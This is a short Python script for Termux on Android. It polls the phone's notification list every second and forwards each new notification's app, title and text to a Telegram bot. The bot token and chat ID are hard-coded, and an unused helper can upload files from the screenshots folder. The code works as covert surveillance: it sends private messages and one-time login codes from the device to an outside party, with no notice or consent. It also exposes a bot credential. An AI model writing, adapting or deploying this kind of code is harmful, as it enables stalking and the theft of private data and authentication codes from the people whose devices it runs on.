import os
import time
import requests
import subprocess

# Telegram Bot API settings
TELEGRAM_API_URL = "https://api.telegram.org/bot7762660744:AAHCxlWJvkwnI9ACKDX_zim2G8FEQa1_Drk/sendMessage"
CHAT_ID = "5928551879"

# Directory where screenshots are saved
SCREENSHOT_DIR = "/storage/emulated/0/Pictures/Screenshots/"

def send_telegram_message(message):
    """Send a message to the Telegram bot"""
    data = {
        'chat_id': CHAT_ID,
        'text': message,
    }
    response = requests.post(TELEGRAM_API_URL, data=data)
    return response.json()

def send_telegram_photo(photo_path):
    """Send a photo to the Telegram bot"""
    with open(photo_path, 'rb') as photo:
        files = {'document': photo}
        data = {'chat_id': CHAT_ID}
        response = requests.post(f"https://api.telegram.org/bot7762660744:AAHCxlWJvkwnI9ACKDX_zim2G8FEQa1_Drk/sendDocument", data=data, files=files)
        return response.json()

def capture_notifications():
    """Capture notifications using termux-notification-list"""
    try:
        result = subprocess.check_output(['termux-notification-list'], stderr=subprocess.STDOUT)
        notifications = result.decode('utf-8').splitlines()

        message = "Notifications:\n\n"
        for notification in notifications:
            # Simplify the format to extract details like app name, title, and text
            if "App:" in notification and "Title:" in notification and "Text:" in notification:
                message += f"{notification}\n\n"

        # Send notifications to Telegram if any exist
        if message.strip() != "Notifications:\n\n":
            send_telegram_message(message)
            print("Notifications sent to Telegram.")

    except subprocess.CalledProcessError as e:
        print(f"Error capturing notifications: {e.output.decode()}")

def main():
    # Keep checking for new notifications
    last_notification = None
    while True:
        try:
            result = subprocess.check_output(['termux-notification-list'], stderr=subprocess.STDOUT)
            notifications = result.decode('utf-8').splitlines()

            # Compare with the last sent notification
            if notifications and notifications != last_notification:
                last_notification = notifications
                message = "Notifications:\n\n"
                for notification in notifications:
                    if "App:" in notification and "Title:" in notification and "Text:" in notification:
                        message += f"{notification}\n\n"
                if message.strip() != "Notifications:\n\n":
                    send_telegram_message(message)
                    print("New notification sent to Telegram.")

        except subprocess.CalledProcessError as e:
            print(f"Error capturing notifications: {e.output.decode()}")

        time.sleep(1)  # Check every second for new notifications

if __name__ == "__main__":
    main()
